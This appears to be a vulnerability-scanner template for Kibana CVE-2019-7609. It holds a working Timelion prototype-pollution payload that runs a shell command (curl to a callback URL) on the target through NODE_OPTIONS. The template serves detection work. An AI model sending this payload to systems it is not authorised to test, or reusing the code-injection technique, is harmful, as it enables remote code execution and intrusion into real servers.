name: poc-yaml-kibana-cve-2019-7609
set:
  reverse: newReverse()
  reverseURL: reverse.url
rules:
  - method: POST
    path: /api/timelion/run
    headers:
      kbn-version: 6.5.4
      Content-Type: application/json;charset=UTF-8
    body: >-
      {"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"curl {{reverseURL}}\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"auto","timezone":"Asia/Shanghai"}}
    follow_redirects: false
    expression: |
      response.status == 200 && reverse.wait(15)
detail:
  Affected Version: "Kibana < 6.6.1"
  author: hanxiansheng26(https://github.com/hanxiansheng26)
  links:
    - https://www.cnblogs.com/mrhonest/p/11711769.html